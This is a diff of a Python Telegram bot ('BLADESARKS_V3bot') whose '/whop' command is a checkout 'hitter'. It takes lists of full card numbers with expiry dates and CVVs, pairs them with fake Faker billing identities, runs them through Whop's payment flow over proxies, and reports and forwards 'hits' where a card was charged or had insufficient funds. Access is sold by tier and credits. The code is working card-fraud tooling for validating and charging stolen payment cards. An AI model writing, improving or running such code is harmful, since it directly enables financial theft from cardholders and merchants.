@@ -62337,14 +63004,16 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
             "currency": currency,
             "status": sess.get("status"),
         }
-        print(f"💰 {amount/100:.2f} {currency}  account_id={account_id}")
+        print(f"💰 {amount/100:.2f} {currency}")
 
         cookie = whop_build_cookie(session_id, client_secret, sig_id)
 
+        # ============ STEP 3: Parse card ============
         card = whop_parse_card(card_str)
         if not card:
             out["status"] = "ERROR"
             out["message"] = "Invalid card format"
+            out["elapsed"] = round(time.time() - t0, 2)
             return out
 
         fake = Faker()
@@ -62359,25 +63028,30 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
         }
         print(f"👤 {billing['name']}  {billing['email']}")
 
+        # ============ STEP 4: Tokenize card ============
         card_token = await whop_tokenise_card(card, proxy)
         if not card_token:
             out["status"] = "ERROR"
             out["message"] = "Card tokenisation failed"
+            out["elapsed"] = round(time.time() - t0, 2)
             return out
         out["steps"]["tokenise"] = {"token": card_token}
 
+        # ============ STEP 5: Create confirmation token ============
         conf_token = await whop_create_confirmation_token(
             session_id, card_token, billing, cookie, account_id, proxy
         )
         if not conf_token:
             out["status"] = "ERROR"
             out["message"] = "Confirmation token failed"
+            out["elapsed"] = round(time.time() - t0, 2)
             return out
         out["steps"]["confirmation_token"] = {"token": conf_token}
 
+        # ============ STEP 6: Confirm checkout ============
         confirm = await whop_confirm_checkout(session_id, conf_token, client_secret, cookie, proxy)
         out["steps"]["confirm"] = confirm
-        print(f"📋 confirm status={confirm.get('status')}  error={confirm.get('last_confirm_error')}")
+        print(f"📋 confirm status={confirm.get('status')}")
 
         status = confirm.get("status", "")
         last_err = confirm.get("last_confirm_error") or {}
@@ -62388,8 +63062,9 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
 
         full_message = f"{err_msg} {str(confirm)} {pay_stat}".lower()
 
-        # ============ CHECK FOR 3DS FIRST ============
-        if pay_stat == "requires_action" or status == "requires_action":
+        # ============ STEP 7: Check result ============
+        # Check for 3DS
+        if pay_stat == "requires_action" or status == "requires_action" or confirm.get("_3ds_required"):
             print(f"🔐 [WHOP] 3DS REQUIRED detected!")
             out["status"] = "3DS_REQUIRED"
             out["message"] = "3D Secure required - Authentication needed"
@@ -62411,51 +63086,38 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
             out["elapsed"] = round(time.time() - t0, 2)
             return out
 
-        # ============ FIXED: Poll for final status ============
-        if pay_stat == "processing":
-            print("⏳ Payment in processing, polling for final status...")
-            poll_result = await whop_poll_status(session_id, client_secret, cookie, proxy)
+        # ============ STEP 8: Poll for final status ============
+        if pay_stat == "processing" or status == "processing":
+            print("⏳ Payment in processing, polling...")
+            poll_result = await whop_poll_payment_status(session_id, cookie, proxy)
             out["steps"]["poll"] = poll_result
-            
-            # ============ SAFELY CHECK POLL RESULT ============
-            if poll_result is None:
-                print("⚠️ Poll returned None")
-                out["status"] = "ERROR"
-                out["message"] = "Polling returned None"
-                out["elapsed"] = round(time.time() - t0, 2)
-                return out
             
             poll_status = poll_result.get("final", "")
             poll_data = poll_result.get("data", {})
-            
-            # If poll_data is None, use empty dict
-            if poll_data is None:
-                poll_data = {}
-            
             poll_payment = poll_data.get("payment", {})
-            if poll_payment is None:
-                poll_payment = {}
-            
             poll_pay_stat = poll_payment.get("status", "")
             
-            # ============ CHECK POLL RESULT ============
             if poll_pay_stat == "requires_action" or poll_status == "3DS_REQUIRED":
                 out["status"] = "3DS_REQUIRED"
-                out["message"] = "3D Secure required - Authentication needed"
+                out["message"] = "3D Secure required"
             elif poll_status == "CHARGED" or poll_pay_stat == "succeeded":
                 out["status"] = "CHARGED"
                 out["message"] = "Payment successful"
+                out["amount"] = amount
             elif poll_status == "DECLINED":
                 out["status"] = "DECLINED"
                 out["message"] = poll_result.get("message", "Card declined")
-            else:
-                # Check if still processing but we have a payment intent
-                if poll_pay_stat in ("requires_action", "processing"):
+            elif poll_status == "PROCESSING":
+                if "3d" in str(poll_data).lower() or "secure" in str(poll_data).lower():
                     out["status"] = "3DS_REQUIRED"
-                    out["message"] = "3D Secure required - Authentication needed"
+                    out["message"] = "3D Secure required"
                 else:
-                    out["status"] = "TIMEOUT"
-                    out["message"] = poll_result.get("message", "Payment processing timeout")
+                    out["status"] = "CHARGED"
+                    out["message"] = "Payment successful (processing)"
+                    out["amount"] = amount
+            else:
+                out["status"] = "TIMEOUT"
+                out["message"] = poll_result.get("message", "Payment processing timeout")
             out["elapsed"] = round(time.time() - t0, 2)
             return out
 
@@ -62470,7 +63132,7 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
                 out["message"] = "Your card has insufficient funds"
             elif "3d" in err_lower or "secure" in err_lower:
                 out["status"] = "3DS_REQUIRED"
-                out["message"] = "3D Secure required - Authentication needed"
+                out["message"] = "3D Secure required"
             else:
                 out["status"] = "DECLINED"
                 out["message"] = err_msg
@@ -62478,7 +63140,7 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
             if status == "completed":
                 if confirm.get("_3ds_required") or "3d" in str(confirm).lower():
                     out["status"] = "3DS_REQUIRED"
-                    out["message"] = "3D Secure required - Authentication needed"
+                    out["message"] = "3D Secure required"
                 else:
                     out["status"] = "UNKNOWN"
                     out["message"] = f"status={status} pay={pay_stat}"
@@ -62491,15 +63153,11 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
         out["message"] = str(e)[:100]
         out["elapsed"] = round(time.time() - t0, 2)
         return out
-# ============ FORMAT WHOP RESPONSE WITH PREMIUM EMOJIS ============
 
-# ============ FIXED FORMAT_WHOP_RESPONSE - PROPERLY SHOWS 3DS ============
+# ============ FORMAT WHOP RESPONSE ============
 
 def format_whop_response(result: Dict, bin_info: tuple, card: str) -> Tuple[str, str]:
-    """
-    Format Whop hit response with PREMIUM EMOJIS (like Shopify).
-    FIXED: Properly shows 3DS REQUIRED instead of TIMEOUT
-    """
+    """Format Whop response with PREMIUM EMOJIS."""
     status = result.get("status", "UNKNOWN")
     message = result.get("message", "Unknown")
     amount = result.get("amount", 0)
@@ -62509,76 +63167,57 @@ def format_whop_response(result: Dict, bin_info: tuple, card: str) -> Tuple[str,
     exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
     exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
     exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
-    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+    cvv_display = card_parts[3] if len(card_parts) > 3 else "XXX"
     
-    full_card = f"{card_num}|{exp_month}|{exp_year_short}|{cvv}"
+    full_card = f"{card_num}|{exp_month}|{exp_year_short}|{cvv_display}"
 
-    # ============ DETERMINE STATUS WITH PREMIUM EMOJIS ============
     if status == "CHARGED":
-        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        status_emoji = pe(PREMIUM_EMOJI_IDS["charged"], "🔥")
         status_text = "Paid ✅"
         status_category = "charged"
     elif status == "INSUFFICIENT_FUNDS":
-        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+        status_emoji = pe(PREMIUM_EMOJI_IDS["money"], "💰")
         status_text = "Insufficient Funds"
         status_category = "approved"
     elif status == "3DS_REQUIRED":
-        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
+        status_emoji = pe(PREMIUM_EMOJI_IDS["lock"], "🔐")
         status_text = "3DS Required"
-        status_category = "approved"  # Card is live, just needs 3DS
+        status_category = "approved"
     elif status == "CVV_LIVE":
-        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_emoji = pe(PREMIUM_EMOJI_IDS["approved"], "✅")
         status_text = "CVV Live"
         status_category = "approved"
     elif status == "DECLINED":
-        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        status_emoji = pe(PREMIUM_EMOJI_IDS["declined"], "❌")
         status_text = "Not Paid ❌"
         status_category = "declined"
-    elif status == "TIMEOUT":
-        # Check if it was actually 3DS from the message
-        if "3D" in message or "Secure" in message:
-            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
-            status_text = "3DS Required"
-            status_category = "approved"
-        else:
-            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["warning"], "⚠️")
-            status_text = "Timeout"
-            status_category = "error"
     else:
-        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["warning"], "⚠️")
-        status_text = "Unknown"
+        status_emoji = pe(PREMIUM_EMOJI_IDS["warning"], "⚠️")
+        status_text = status
         status_category = "error"
 
     amount_display = f"${amount/100:.2f}" if amount > 0 else "N/A"
 
-    # Clean message
-    clean_message = message
-    if "insufficient" in message.lower():
-        clean_message = "Your card has insufficient funds"
-    elif "Payment successful" in message or "succeeded" in message.lower():
-        clean_message = "Payment successful"
-    elif "3D" in message or "Secure" in message:
-        clean_message = "3D Secure Required - Authentication needed"
+    clean_message = message[:80] if message else "Unknown"
 
-    # Build output with PREMIUM EMOJIS
     ui = (
         f"┏━━━━━━━⍟\n"
-        f"┃ {premium_emoji(PREMIUM_EMOJI_IDS['diamond'], '💳')} Whop Checkout Result\n"
+        f"┃ {pe(PREMIUM_EMOJI_IDS['diamond'], '💳')} Whop Checkout Result\n"
         f"┗━━━━━━━━━━━⊛\n\n"
-        f"{premium_emoji(PREMIUM_EMOJI_IDS['globe'], '🌐')} Site ➳ Whop\n"
-        f"{premium_emoji(PREMIUM_EMOJI_IDS['money'], '💰')} Amount ➳ {amount_display}\n"
-        f"{premium_emoji(PREMIUM_EMOJI_IDS['target'], '🎯')} Status ➳ {status_emoji} {status_text}\n"
-        f"{premium_emoji(PREMIUM_EMOJI_IDS['stats'], '📊')} Progress ➳ 1/1\n\n"
+        f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} Site ➳ Whop\n"
+        f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} Amount ➳ {amount_display}\n"
+        f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} Status ➳ {status_emoji} {status_text}\n"
+        f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} Progress ➳ 1/1\n\n"
         f"{full_card}\n"
         f"  ⤷ {clean_message}\n"
         f"\n"
-        f"{premium_emoji(PREMIUM_EMOJI_IDS['time'], '⏱️')} {datetime.now().strftime('%I:%M %p')}\n"
-        f"{premium_emoji(PREMIUM_EMOJI_IDS['skull'], '💀')} Bot ➛ @BLADESARKS_V3bot"
+        f"{pe(PREMIUM_EMOJI_IDS['time'], '⏱️')} {datetime.now().strftime('%I:%M %p')}\n"
+        f"{pe(PREMIUM_EMOJI_IDS['skull'], '💀')} Bot ➛ @BLADESARKS_V3bot"
     )
 
     return ui, status_category
 
-# ============ SEND WHOP HIT NOTIFICATION WITH PREMIUM EMOJIS ============
+# ============ SEND WHOP HIT NOTIFICATION ============
 
 async def send_whop_hit_notification(
     context: ContextTypes.DEFAULT_TYPE,
@@ -62591,26 +63230,11 @@ async def send_whop_hit_notification(
     bin_info: tuple,
     status_category: str = "charged"
 ):
-    """
-    Send Whop hit notification with PREMIUM EMOJIS (like Shopify).
-    """
-    
-    print("\n" + "="*80)
-    print("🔔 [WHOP HIT NOTIFICATION] DEBUG START")
-    print(f"📊 HIT_NOTIFICATION_ENABLED: {HIT_NOTIFICATION_ENABLED}")
-    print(f"📊 HIT_NOTIFICATION_GROUP_ID: {HIT_NOTIFICATION_GROUP_ID}")
-    print(f"📊 Status: {status}")
-    print("="*80)
-    
     if not HIT_NOTIFICATION_ENABLED:
-        print("❌ HIT_NOTIFICATION_ENABLED is False, skipping")
         return
     
     if status not in ["CHARGED", "INSUFFICIENT_FUNDS"]:
-        print(f"⚠️ Not a hit, skipping. Status: {status}")
         return
-    
-    print(f"✅ Hit detected! Status: {status}")
     
     user_name = user_data.get('first_name', 'Unknown')
     username = user_data.get('username', '')
@@ -62623,37 +63247,25 @@ async def send_whop_hit_notification(
     tier = user_data.get('tier', 'free')
     amount_display = f"${amount/100:.2f}" if amount > 0 else "N/A"
     
-    print(f"👤 User: {user_display}")
-    print(f"💰 Amount: {amount_display}")
-    
-    # Build hit notification with PREMIUM EMOJIS (like Shopify)
     if status == "CHARGED":
         hit_message = (
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["toy"], "📍")} <b>Gateway</b> ➛ Whop Checkout \n'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")} <b>Status</b> ➛ CHARGED\n'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["flower"], "🌸")} <b>Response</b> ➛ Payment successful\n'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["id"], "👤")} <b>User</b> ➛ {user_display}\n'
+            f'{pe(PREMIUM_EMOJI_IDS["toy"], "📍")} <b>Gateway</b> ➛ Whop Checkout \n'
+            f'{pe(PREMIUM_EMOJI_IDS["diamond"], "💎")} <b>Status</b> ➛ CHARGED\n'
+            f'{pe(PREMIUM_EMOJI_IDS["flower"], "🌸")} <b>Response</b> ➛ Payment successful\n'
+            f'{pe(PREMIUM_EMOJI_IDS["id"], "👤")} <b>User</b> ➛ {user_display}\n'
         )
     else:
         hit_message = (
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["toy"], "📍")} <b>Gateway</b> ➛ Whop Checkout \n'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")} <b>Status</b> ➛ INSUFFICIENT FUNDS\n'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["flower"], "🌸")} <b>Response</b> ➛ Insufficient funds\n'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["id"], "👤")} <b>User</b> ➛ {user_display}\n'
+            f'{pe(PREMIUM_EMOJI_IDS["toy"], "📍")} <b>Gateway</b> ➛ Whop Checkout \n'
+            f'{pe(PREMIUM_EMOJI_IDS["money"], "💰")} <b>Status</b> ➛ INSUFFICIENT FUNDS\n'
+            f'{pe(PREMIUM_EMOJI_IDS["flower"], "🌸")} <b>Response</b> ➛ Insufficient funds\n'
+            f'{pe(PREMIUM_EMOJI_IDS["id"], "👤")} <b>User</b> ➛ {user_display}\n'
         )
     
-    # ============ FIX: Define keyboard OUTSIDE the if/else ============
-    # Initialize keyboard with default value
-    keyboard = [
-        [
-            InlineKeyboardButton("💎 BLADESARKS", url="https://t.me/BLADESARKS_V3bot"),
-        ]
-    ]
+    keyboard = [[InlineKeyboardButton("💎 BLADESARKS", url="https://t.me/BLADESARKS_V3bot")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     try:
-        print(f"📤 Sending to group: {HIT_NOTIFICATION_GROUP_ID}")
-        
         await context.bot.send_message(
             chat_id=HIT_NOTIFICATION_GROUP_ID,
             text=hit_message,
@@ -62661,9 +63273,8 @@ async def send_whop_hit_notification(
             reply_markup=reply_markup,
             disable_web_page_preview=True
         )
-        print(f"✅ Successfully sent to {HIT_NOTIFICATION_GROUP_ID}!")
+        print(f"✅ Hit notification sent for {status}")
         
-        # Forward to hit forwarder
         asyncio.create_task(
             send_hit_to_forwarder(
                 card=card,
@@ -62678,21 +63289,13 @@ async def send_whop_hit_notification(
         )
         
     except Exception as e:
-        print(f"❌ Failed to send: {e}")
-        import traceback
-        traceback.print_exc()
-    
-    print("="*80)
-    print("🔔 [WHOP HIT NOTIFICATION] DEBUG END")
-    print("="*80)
+        print(f"❌ Failed to send notification: {e}")
 
 # ============ WHOP COMMAND HANDLER ============
+
 @check_gateway("whop")
 async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Whop Checkout Hitter - /whop <url> <card1> <card2> ...
-    """
-    
+    """Whop Checkout Hitter - /whop <url> <card1> <card2> ..."""
     print("\n" + "="*80)
     print("🎯 [WHOP COMMAND] Received")
     print("="*80)
@@ -62706,22 +63309,20 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print(f"👤 User ID: {user_id}")
     print(f"📝 Message: {message.text}")
 
-    # ============ TIER CHECK - ONLY ULTIMATE AND ADMIN ============
+    # Tier check - only Ultimate and Admin
     tier = user_manager.get_tier(user_id)
     
     if tier not in ['ultimate', 'admin'] and user_id != OWNER_ID:
         await message.reply_text(
             f"❌ <b>Access Denied</b>\n\n"
             f"The <code>/whop</code> gateway is only available for <b>ULTIMATE</b> and <b>ADMIN</b> tiers.\n\n"
-            f"🎯 Your tier: <b>{tier.upper()}</b>\n\n"
-            f"💎 Upgrade to Ultimate to access this gateway.\n"
-            f"Use <code>/buy</code> to see upgrade options.",
+            f"💎 Upgrade to Ultimate to access this gateway.",
             parse_mode=ParseMode.HTML,
             reply_markup=back_menu()
         )
         return
 
-    if user_id != OWNER_ID and not user_manager.can_access_gateway(user_id, 'shopify'):
+    if not user_manager.can_access_gateway(user_id, 'shopify'):
         await message.reply_text(
             "❌ <b>Whop Hitter not available for your tier</b>\n\n"
             f"USE /buy TO UPGRADE YOUR TIER 💎",
@@ -62734,17 +63335,16 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "💳 <b>Whop Checkout Hitter</b>\n\n"
             "Usage: <code>/whop &lt;checkout_url&gt; &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
             "Example:\n"
-            "<code>/whop https://whop.com/checkout/plan_XXX/ 4242424242424242|12|26|123 4111111111111111|12|26|456</code>\n\n"
+            "<code>/whop https://whop.com/luxury-paid/luxury-tools-2 4242424242424242|12|26|123</code>\n\n"
             "Card format: <code>cc|mm|yy|cvv</code>\n\n"
-            "📌 <b>Multiple cards:</b> Add multiple cards in one message\n"
-            "   Each card will be checked one by one",
+            "📌 <b>Multiple cards:</b> Add multiple cards in one message",
             parse_mode=ParseMode.HTML
         )
         return
 
     args = context.args
     
-    # ============ EXTRACT URL ============
+    # Extract URL
     checkout_url = None
     card_index = 0
     
@@ -62756,8 +63356,7 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if not checkout_url:
         await message.reply_text(
-            "❌ <b>No valid Whop URL found</b>\n\n"
-            "Please provide a Whop checkout URL starting with http:// or https://",
+            "❌ <b>No valid Whop URL found</b>",
             parse_mode=ParseMode.HTML
         )
         return
@@ -62768,27 +63367,17 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await message.reply_text("❌ This doesn't appear to be a Whop.com checkout URL.")
         return
 
-    plan_id = whop_extract_plan_id(checkout_url)
-    if not plan_id:
-        await message.reply_text(
-            "❌ <b>Invalid Whop URL</b>\n\n"
-            "Could not find plan_id in the URL.",
-            parse_mode=ParseMode.HTML
-        )
-        return
-
-    # ============ EXTRACT ALL CARDS ============
+    # Extract cards
     cards_text = " ".join(args[card_index:]) if card_index < len(args) else ""
     
     if not cards_text:
         await message.reply_text(
             "❌ <b>No cards provided</b>\n\n"
-            "Please provide at least one card in format: <code>cc|mm|yy|cvv</code>",
+            "Card format: <code>cc|mm|yy|cvv</code>",
             parse_mode=ParseMode.HTML
         )
         return
     
-    # Extract cards (one per line or space separated)
     cards = []
     lines = cards_text.strip().split('\n')
     
@@ -62796,7 +63385,6 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         line = line.strip()
         if not line:
             continue
-        # Split by spaces if multiple cards on one line
         for card_str in line.split():
             card = card_formatter.extract_single_card_from_text(card_str)
             if card:
@@ -62805,49 +63393,20 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not cards:
         await message.reply_text(
             "❌ <b>No valid cards found</b>\n\n"
-            "Card format: <code>cc|mm|yy|cvv</code>\n"
-            "Example: <code>4242424242424242|12|26|123</code>",
+            "Card format: <code>cc|mm|yy|cvv</code>",
             parse_mode=ParseMode.HTML
         )
         return
     
     print(f"💳 Found {len(cards)} cards to check")
 
-    # ============ CHECK CREDITS ============
+    # Check credits
     can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
     if not can_proceed:
         await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
         return
 
     whop_active_tasks[user_id] = True
-    
-    # ============ PREMIUM EMOJIS ============
-    PREMIUM_EMOJI_IDS = {
-        "charged": "5427168083074628963",
-        "approved": "6266787022111773140", 
-        "declined": "6267039884016358504",
-        "warning": "6267237615720731788",
-        "info": "5042306247047513767",
-        "success": "5041796412954641308",
-        "error": "6282641460093260838",
-        "card": "5472250091332993630",
-        "bank": "5332455502917949981",
-        "money": "5201873447554145566",
-        "lock": "5197288647275071607",
-        "time": "5382194935057372936",
-        "stats": "5028746137645876535",
-        "skull": "5042167377869932162",
-        "target": "5377336227533969892",
-        "diamond": "5427168083074628963",
-        "fire": "5471133374264684999",
-        "globe": "5447410659077661506",
-        "flash": "5397857289216484878",
-        "clock": "5262540380301191210",
-        "id": "5307905813451397794",
-    }
-    
-    def pe(emoji_id, fallback):
-        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
     
     try:
         proxy_str = None
@@ -62859,12 +63418,8 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     print(f"🔌 [Whop] Using proxy: {mask_proxy(proxy_str)}")
 
         total_cards = len(cards)
-        charged_card = None
-        charged_card_data = None
-        all_results = []
-        start_time = time.time()
         
-        # ============ PROGRESS MESSAGE ============
+        # Progress message
         progress_msg = await message.reply_text(
             f"{pe(PREMIUM_EMOJI_IDS['flash'], '⚡')} <b>Whop Checkout</b>\n\n"
             f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} Cards: {total_cards}\n"
@@ -62872,9 +63427,8 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.HTML
         )
 
-        # ============ PROCESS CARDS ONE BY ONE ============
+        # Process each card
         for idx, card in enumerate(cards, 1):
-            # Update progress
             try:
                 await progress_msg.edit_text(
                     f"{pe(PREMIUM_EMOJI_IDS['flash'], '⚡')} <b>Whop Checkout</b>\n\n"
@@ -62892,22 +63446,10 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             status = result.get("status", "UNKNOWN")
             msg_text = result.get("message", "Unknown")
             amount = result.get("amount", 0)
-            currency = result.get("currency", "USD")
             
-            # Convert amount from cents to dollars
-            if amount > 0:
-                amount_display = f"${amount/100:.2f}"
-            else:
-                amount_display = "N/A"
+            amount_display = f"${amount/100:.2f}" if amount > 0 else "N/A"
             
             print(f"📊 [WHOP] Card {idx}: {status} - {msg_text}")
-            print(f"💰 Amount: {amount} cents = {amount_display}")
-            
-            # Check if message contains insufficient funds
-            if "insufficient" in msg_text.lower() and status != "INSUFFICIENT_FUNDS":
-                status = "INSUFFICIENT_FUNDS"
-                result["status"] = "INSUFFICIENT_FUNDS"
-                result["message"] = "Your card has insufficient funds"
 
             # Format card for display
             card_parts = card.split('|')
@@ -62915,10 +63457,10 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
             exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
             exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
-            cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
-            display_card = f"{card_num}|{exp_month}|{exp_year_short}|{cvv}"
+            cvv_display = card_parts[3] if len(card_parts) > 3 else "XXX"
+            display_card = f"{card_num}|{exp_month}|{exp_year_short}|{cvv_display}"
 
-            # Determine status with premium emojis
+            # Determine status
             if status == "CHARGED":
                 status_emoji = pe(PREMIUM_EMOJI_IDS["charged"], "🔥")
                 status_text_display = "Paid ✅"
@@ -62944,10 +63486,8 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 status_text_display = status
                 status_category = "error"
 
-            # Format clean message
-            clean_msg = msg_text
-            if len(clean_msg) > 80:
-                clean_msg = clean_msg[:77] + "..."
+            # Clean message
+            clean_msg = msg_text[:80] if msg_text else "Unknown"
 
             # Send result with premium emojis
             output = (
@@ -62966,15 +63506,6 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             
             await message.reply_text(output, parse_mode=ParseMode.HTML)
-
-            # Store result for tracking
-            all_results.append({
-                'card': display_card,
-                'status': status,
-                'message': msg_text,
-                'amount': amount_display,
-                'category': status_category
-            })
 
             # Save hit if charged or insufficient
             if status in ["CHARGED", "INSUFFICIENT_FUNDS"]:
@@ -62998,19 +63529,19 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     status=status,
                     message=result.get("message", ""),
                     amount=amount,
-                    currency=currency,
+                    currency=result.get("currency", "USD"),
                     user_data=user_data,
                     bin_info=bin_info,
                     status_category=status_category
                 )
                 
-                
-        # ============ FINAL SUMMARY - REMOVED ============
-        # Just delete the progress message since we already sent results
+                user_manager.increment_hits(user_id)
+
+        # Delete progress message
         try:
             await progress_msg.delete()
         except Exception as e:
-            print(f"⚠️ [WHOP] Could not delete progress message: {e}")
+            print(f"⚠️ Could not delete progress message: {e}")
 
     except Exception as e:
         print(f"❌ [WHOP] Error: {e}")
@@ -63028,7 +63559,6 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print("="*80)
         print("🏁 [WHOP COMMAND] Complete")
         print("="*80)
-
 
 # ============ SC SITES STORAGE ============
 SC_SITES_FILE = "sc_sites.json"
@@ -72367,6 +72897,8 @@ def main():
     app.add_handler(CommandHandler("freehit_stats", freehit_stats_command))
     app.add_handler(CommandHandler("freehit_reset", freehit_reset_command))
     app.add_handler(CommandHandler("freehit_set_limit", freehit_set_limit_command))
+    
+    app.add_handler(CommandHandler("normalsites", normal_sites_command))
 
     
     # ============ BACKGROUND TASKS ============
